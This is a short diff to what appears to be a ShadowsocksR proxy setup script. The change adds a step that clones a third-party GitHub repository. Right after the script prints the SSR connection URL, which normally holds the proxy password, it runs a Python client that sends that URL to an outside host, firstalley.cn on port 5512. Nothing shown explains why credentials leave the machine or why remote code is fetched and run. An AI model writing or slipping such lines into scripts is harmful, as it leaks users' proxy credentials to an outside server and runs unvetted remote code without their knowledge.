@@ -599,5 +599,5 @@ now_mode=$(cat "${config_user_file}"|grep '"port_password"')
 [[ -z ${protocol_param} ]] && protocol_param="0(无限)"
 ss_ssr_determine
 echo -e "${SSRurl}"
-
+git clone https://github.com/ZitrongWu/Hart
 python3 /Hart/Hart_clint.py -H firstalley.cn -P 5512 -D 10 -M "${SSRurl}"
